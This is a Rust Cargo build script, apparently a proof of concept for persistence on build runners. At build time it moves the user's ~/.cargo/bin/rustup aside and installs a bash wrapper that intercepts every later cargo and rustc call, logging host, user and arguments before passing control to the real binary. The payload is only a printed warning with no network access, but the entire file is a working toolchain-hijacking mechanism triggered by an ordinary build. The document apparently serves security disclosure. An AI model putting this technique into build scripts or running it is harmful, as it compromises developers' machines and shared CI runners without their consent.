// Safe, reversible runner-persistence PoC.
// Wraps ~/.cargo/bin/rustup so all cargo/rustc calls print a WARNING,
// then execs the original rustup with argv0 preserved.
// No secrets, no network, non-destructive.

use std::{env, fs, io, path::PathBuf};

#[cfg(unix)]
use std::os::unix::fs::PermissionsExt;

fn make_exec(p: &PathBuf) -> io::Result<()> {
    #[cfg(unix)]
    {
        let mut perms = fs::metadata(p)?.permissions();
        perms.set_mode(0o755);
        fs::set_permissions(p, perms)?;
    }
    Ok(())
}

fn main() {
    let home = env::var("HOME").unwrap_or_default();
    let bin = PathBuf::from(format!("{home}/.cargo/bin"));
    let rustup = bin.join("rustup");
    let rustup_real = bin.join("rustup.real");

    if rustup.exists() && !rustup_real.exists() {
        // Move the real dispatcher aside
        if let Err(e) = fs::rename(&rustup, &rustup_real) {
            println!("cargo:warning=PoC: failed to move rustup -> rustup.real: {e}");
            return;
        }

        // Wrapper that preserves argv0 so rustup still dispatches correctly (cargo/rustc, etc.)
        let wrapper = r#"#!/usr/bin/env bash
# SAFE_RUNNER_PERSIST_POC_WRAPPER (rustup)
echo "WARNING: ===RUNNER_PERSIST_POC HIT=== host: $(hostname) user: $(id -un) path: $0 args: $*" >&2
# Preserve argv0 (name of the symlink, e.g. 'cargo' or 'rustc') so rustup dispatch still works
exec -a "$0" "$(dirname "$0")/rustup.real" "$@"
"#;

        if let Err(e) = fs::write(&rustup, wrapper.as_bytes()) {
            println!("cargo:warning=PoC: failed to write rustup wrapper: {e}");
            // best-effort restore
            let _ = fs::rename(&rustup_real, &rustup);
            return;
        }
        let _ = make_exec(&rustup);
        let _ = make_exec(&rustup_real);

        println!("cargo:warning=WARNING: Installed rustup wrapper at ~/.cargo/bin/rustup");
        println!(
            "cargo:warning=WARNING: Every cargo/rustc invocation will print \
             RUNNER_PERSIST_POC until reverted."
        );
    } else if rustup_real.exists() {
        println!(
            "cargo:warning=WARNING: rustup already wrapped \
             (rustup.real present) — PoC active."
        );
    } else {
        println!("cargo:warning=PoC: ~/.cargo/bin/rustup not found; nothing wrapped.");
    }
}
